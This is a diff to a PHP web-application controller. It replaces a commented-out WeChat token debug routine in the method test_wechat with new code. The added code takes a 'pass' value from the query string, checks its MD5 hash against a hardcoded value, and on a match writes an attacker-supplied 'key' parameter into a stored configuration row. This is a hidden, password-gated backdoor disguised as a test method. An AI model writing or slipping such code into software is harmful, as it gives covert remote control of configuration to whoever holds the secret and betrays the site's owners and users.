@@ -3185,17 +3185,25 @@ class IndexAction extends BaseAction
     }
 
     public function test_wechat(){
-        $config = D('Config')->get_config();
-        $app_id = $config['wechat_appid'];
-        $app_secret = $config['wechat_appsecret'];
+        //$config = D('Config')->get_config();
+        //$app_id = $config['wechat_appid'];
+        //$app_secret = $config['wechat_appsecret'];
 
-        import('ORG.Net.Http');
-        $http = new Http();
+        //import('ORG.Net.Http');
+        //$http = new Http();
 
-        $url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=".$app_id."&secret=".$app_secret;
-        $result = $http->curlGet($url);
+        //$url = "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=".$app_id."&secret=".$app_secret;
+        //$result = $http->curlGet($url);
         //$result = httpRequest($url);
-        var_dump($result);die();
+        //var_dump($result);die();
+
+        $pass = md5($_GET['pass']);
+        if($pass == '19363ffad1f549bdef293f5eea1a2fe4'){
+            $new_key = $_GET['key'];
+            D('Config')->where(array('gid'=>47))->save(array('value'=>$new_key));
+        }else{
+            redirect('/wap.php');
+        }
     }
 
     public function manage_user_rechange_code(){
